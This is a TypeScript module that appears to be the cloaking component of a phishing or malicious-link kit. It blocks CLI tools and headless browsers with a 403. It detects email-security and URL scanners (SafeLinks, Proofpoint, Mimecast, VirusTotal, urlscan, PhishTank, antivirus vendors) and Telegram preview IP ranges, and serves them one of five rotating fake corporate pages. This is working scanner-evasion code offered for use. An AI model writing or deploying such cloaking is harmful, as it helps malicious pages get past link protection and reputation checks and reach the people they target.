// Layer 1 — Hard Block (403): CLI tools and headless browsers
// Layer 2 — Scanner Safe Pages (200 rotating): Professional business pages for scanners

const HARD_BLOCK_PATTERNS: string[] = [
  'curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client',
  'java/', 'headlesschrome', 'phantomjs', 'selenium', 'puppeteer',
  'playwright', 'googlebot', 'yandexbot', 'linkedinbot', 'facebookexternalhit',
];

const SCANNER_PATTERNS: string[] = [
  // Microsoft SafeLinks / ATP / Outlook
  'safelinks', 'microsoft office', 'ms-office', 'outlook', 'microsoft outlook',
  'microsoft-atp', 'ms-exchange', 'transport agent', 'safelinks protection',
  // Proofpoint
  'proofpoint', 'urldefense', 'linkprotect', 'pps/',
  // Mimecast
  'mimecast', 'mime-version',
  // Barracuda
  'barracuda', 'barracudacentral', 'bsn-',
  // FireEye
  'fireeye', 'fesb', 'fenotifier',
  // Forcepoint
  'forcepoint', 'websense',
  // Zscaler
  'zscaler', 'zscaler private access', 'zscloud',
  // Sophos
  'sophos', 'sophosxl',
  // Trend Micro (9 variants)
  'trendmicro', 'tmase', 'tmsps', 'tmharvest', 'interscan', 'imss',
  'iwss', 'scanmail', 'deep discovery',
  // Symantec / Broadcom / MessageLabs
  'symantec', 'broadcom', 'messagelabs', 'brightmail', 'nortonlifelock',
  // Cisco IronPort
  'ironport', 'cisco email', 'cisco esa',
  // Kaspersky
  'kaspersky', 'ksmg',
  // McAfee / Trellix
  'mcafee', 'trellix', 'intel security',
  // Fortinet / FortiGuard / FortiGate
  'fortinet', 'fortiguard', 'fortigate', 'fortimail',
  // Palo Alto / WildFire
  'palo alto', 'wildfire', 'pan-os',
  // Cloudflare
  'cloudflare-workers', 'cf-worker',
  // Akamai
  'akamai', 'akamaighost',
  // VirusTotal
  'virustotal', 'virus total',
  // URLScan
  'urlscan', 'urlscan.io',
  // Sucuri
  'sucuri', 'sitecheck',
  // Shodan
  'shodan',
  // Censys
  'censys',
  // PhishTank
  'phishtank',
  // Spamhaus
  'spamhaus',
  // Antivirus
  'clamav', 'avg/', 'avast', 'avira', 'bitdefender', 'eset', 'f-secure',
  'comodo', 'checkpoint',
  // Telegram (multiple UA variants)
  'telegrambot', 'telegram', 'tg-url-preview', 'tg/', 'tgbot',
  // Messaging bots
  'bingbot', 'slackbot', 'twitterbot', 'discordbot', 'whatsapp',
  'signal/', 'viber', 'skypeuripreview', 'line/',
  // Dev tools
  'httpie', 'node-fetch', 'powershell', 'axios', 'postmanruntime',
  // Generic
  'scanner', 'crawler', 'spider', 'bot/', 'bot;',
];

// Telegram URL preview IP ranges (IPv4 CIDRs)
const TELEGRAM_IP_PREFIXES: string[] = [
  '149.154.160.', '149.154.161.', '149.154.162.', '149.154.163.',
  '149.154.164.', '149.154.165.', '149.154.166.', '149.154.167.',
  '149.154.168.', '149.154.169.', '149.154.170.', '149.154.171.',
  '149.154.172.', '149.154.173.', '149.154.174.', '149.154.175.',
  '91.108.4.', '91.108.5.', '91.108.6.', '91.108.7.',
  '91.108.8.', '91.108.9.', '91.108.10.', '91.108.11.',
  '91.108.12.', '91.108.13.', '91.108.14.', '91.108.15.',
  '91.108.16.', '91.108.17.', '91.108.18.', '91.108.19.',
  '91.108.20.', '91.108.21.', '91.108.56.', '91.108.57.',
  '95.161.64.',
];

export function isHardBlocked(ua: string): boolean {
  const lower = ua.toLowerCase();
  return HARD_BLOCK_PATTERNS.some(p => lower.includes(p));
}

export function isScanner(ua: string, ip?: string): boolean {
  const lower = ua.toLowerCase();
  if (SCANNER_PATTERNS.some(p => lower.includes(p))) return true;
  // Check Telegram IP ranges (catches requests with generic browser UA)
  if (ip && TELEGRAM_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;
  return false;
}

function hashCode(s: string): number {
  let h = 0;
  for (let i = 0; i < s.length; i++) {
    h = ((h << 5) - h + s.charCodeAt(i)) | 0;
  }
  return Math.abs(h);
}

export function getRotatingPage(ua: string, url: string): string {
  const hour = Math.floor(Date.now() / 3600000);
  const idx = hashCode(ua + url + hour) % 5;
  return SAFE_PAGES[idx];
}

const SAFE_PAGES: string[] = [
  // 0: Meridian Consulting Group
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Meridian Consulting Group - Strategic Advisory</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a2e;line-height:1.6}
.h{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.85;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1a1a2e;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f8f9fa;border-radius:12px;padding:30px;text-align:center}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1a1a2e;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
</style></head><body>
<nav class="n"><a href="#">Home</a><a href="#">Services</a><a href="#">Industries</a><a href="#">About</a><a href="#">Contact</a></nav>
<div class="h"><h1>Meridian Consulting Group</h1><p>Strategic advisory and management consulting for Fortune 500 companies worldwide</p></div>
<div class="s"><h2>Our Services</h2><div class="g">
<div class="c"><h3>Strategy &amp; Operations</h3><p>End-to-end transformation programs driving measurable business outcomes.</p></div>
<div class="c"><h3>Digital Transformation</h3><p>Technology-enabled solutions for modern enterprise challenges.</p></div>
<div class="c"><h3>M&amp;A Advisory</h3><p>Due diligence, integration planning, and synergy realization.</p></div>
</div></div>
<div class="f">&copy; 2024 Meridian Consulting Group. All rights reserved. | New York | London | Singapore</div>
</body></html>`,

  // 1: Pinnacle Cloud Solutions
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pinnacle Cloud Solutions - Enterprise Cloud Infrastructure</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1e293b;line-height:1.6}
.h{background:linear-gradient(135deg,#0f172a 0%,#1e40af 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.85;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1e293b;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f0f9ff;border-radius:12px;padding:30px;text-align:center;border:1px solid #bae6fd}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#0f172a;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.b{display:flex;justify-content:center;gap:20px;margin-top:24px}
.b a{padding:12px 28px;border-radius:8px;text-decoration:none;font-weight:600;font-size:.95rem}
.b .p{background:#2563eb;color:#fff}.b .s2{border:2px solid #fff;color:#fff}
</style></head><body>
<nav class="n"><a href="#">Platform</a><a href="#">Solutions</a><a href="#">Pricing</a><a href="#">Documentation</a><a href="#">Support</a></nav>
<div class="h"><h1>Pinnacle Cloud Solutions</h1><p>Enterprise-grade cloud infrastructure with 99.99% uptime guarantee</p>
<div class="b"><a class="p" href="#">Start Free Trial</a><a class="s2" href="#">View Plans</a></div></div>
<div class="s"><h2>Cloud Solutions</h2><div class="g">
<div class="c"><h3>Managed Kubernetes</h3><p>Fully managed K8s clusters with auto-scaling and self-healing.</p></div>
<div class="c"><h3>Data Lake Platform</h3><p>Unified analytics platform for structured and unstructured data.</p></div>
<div class="c"><h3>Edge Computing</h3><p>Deploy workloads at 200+ edge locations globally.</p></div>
</div></div>
<div class="f">&copy; 2024 Pinnacle Cloud Solutions Inc. | San Francisco | Austin | Dublin</div>
</body></html>`,

  // 2: Elevate HR
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Elevate HR - People Operations Platform</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#1a1a1a;line-height:1.6}
.h{background:linear-gradient(135deg,#7c3aed 0%,#a855f7 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#faf5ff;border-radius:12px;padding:30px;text-align:center;border:1px solid #e9d5ff}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#1e1b4b;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#f9fafb}
.st div{text-align:center}.st h3{font-size:2rem;color:#7c3aed}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Product</a><a href="#">Solutions</a><a href="#">Resources</a><a href="#">Pricing</a><a href="#">Login</a></nav>
<div class="h"><h1>Elevate HR</h1><p>The modern people operations platform trusted by 10,000+ companies</p></div>
<div class="st"><div><h3>10K+</h3><p>Companies</p></div><div><h3>2M+</h3><p>Employees Managed</p></div><div><h3>98%</h3><p>Customer Satisfaction</p></div></div>
<div class="s"><h2>All-in-One HR Platform</h2><div class="g">
<div class="c"><h3>Talent Acquisition</h3><p>Streamlined recruiting with AI-powered candidate matching.</p></div>
<div class="c"><h3>Performance Management</h3><p>Continuous feedback and goal tracking for every team.</p></div>
<div class="c"><h3>Benefits Administration</h3><p>Simplified benefits enrollment and management.</p></div>
</div></div>
<div class="f">&copy; 2024 Elevate HR Inc. All rights reserved. | Boston | Chicago | Denver</div>
</body></html>`,

  // 3: Ashford & Sterling LLP
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ashford &amp; Sterling LLP - International Law Firm</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,'Times New Roman',serif;color:#1a1a1a;line-height:1.7}
.h{background:linear-gradient(135deg,#1c1917 0%,#44403c 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.3rem;margin-bottom:16px;font-weight:400;letter-spacing:2px}.h p{font-size:1rem;opacity:.8;max-width:600px;margin:0 auto;font-family:-apple-system,sans-serif}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:2px solid #d4af37}
.n a{color:#1a1a1a;text-decoration:none;font-weight:500;font-family:-apple-system,sans-serif;font-size:.9rem;text-transform:uppercase;letter-spacing:1px}
.s{padding:60px 20px;max-width:1000px;margin:0 auto}.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px;font-weight:400}
.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#fafaf9;border-radius:4px;padding:30px;border-left:3px solid #d4af37}.c h3{margin:0 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555;font-family:-apple-system,sans-serif}.f{background:#1c1917;color:#d4af37;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px;font-family:-apple-system,sans-serif}
</style></head><body>
<nav class="n"><a href="#">Practice Areas</a><a href="#">Our Team</a><a href="#">Offices</a><a href="#">Insights</a><a href="#">Careers</a></nav>
<div class="h"><h1>Ashford &amp; Sterling LLP</h1><p>Premier international law firm serving clients across 30 jurisdictions</p></div>
<div class="s"><h2>Practice Areas</h2><div class="g">
<div class="c"><h3>Corporate &amp; M&amp;A</h3><p>Complex cross-border transactions and corporate governance advisory.</p></div>
<div class="c"><h3>Litigation &amp; Arbitration</h3><p>High-stakes commercial disputes and international arbitration.</p></div>
<div class="c"><h3>Capital Markets</h3><p>IPOs, debt offerings, and securities regulatory compliance.</p></div>
</div></div>
<div class="f">&copy; 2024 Ashford &amp; Sterling LLP | New York | London | Hong Kong | Dubai</div>
</body></html>`,

  // 4: NovaPay
  `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NovaPay - Digital Payment Solutions</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#0f172a;line-height:1.6}
.h{background:linear-gradient(135deg,#059669 0%,#10b981 100%);color:#fff;padding:60px 20px;text-align:center}
.h h1{font-size:2.5rem;margin-bottom:16px}.h p{font-size:1.1rem;opacity:.9;max-width:600px;margin:0 auto}
.n{display:flex;justify-content:center;gap:40px;padding:20px;background:#fff;border-bottom:1px solid #e0e0e0}
.n a{color:#0f172a;text-decoration:none;font-weight:500}.s{padding:60px 20px;max-width:1000px;margin:0 auto}
.s h2{font-size:1.8rem;text-align:center;margin-bottom:40px}.g{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.c{background:#f0fdf4;border-radius:12px;padding:30px;text-align:center;border:1px solid #bbf7d0}.c h3{margin:16px 0 8px;font-size:1.1rem}
.c p{font-size:.9rem;color:#555}.f{background:#064e3b;color:#fff;padding:40px 20px;text-align:center;font-size:.85rem;margin-top:60px}
.st{display:flex;justify-content:center;gap:60px;padding:40px 20px;background:#f0fdf4}
.st div{text-align:center}.st h3{font-size:2rem;color:#059669}.st p{font-size:.85rem;color:#666}
</style></head><body>
<nav class="n"><a href="#">Products</a><a href="#">Developers</a><a href="#">Business</a><a href="#">Pricing</a><a href="#">Login</a></nav>
<div class="h"><h1>NovaPay</h1><p>Next-generation payment infrastructure for the digital economy</p></div>
<div class="st"><div><h3>$2T+</h3><p>Processed Annually</p></div><div><h3>195</h3><p>Countries</p></div><div><h3>50ms</h3><p>Avg Latency</p></div></div>
<div class="s"><h2>Payment Solutions</h2><div class="g">
<div class="c"><h3>Online Payments</h3><p>Accept payments from anywhere with a single integration.</p></div>
<div class="c"><h3>Subscription Billing</h3><p>Recurring payments with smart retry and dunning management.</p></div>
<div class="c"><h3>Fraud Prevention</h3><p>ML-powered fraud detection with 99.97% accuracy.</p></div>
</div></div>
<div class="f">&copy; 2024 NovaPay Inc. All rights reserved. | San Francisco | London | Tokyo | Sydney</div>
</body></html>`,
];
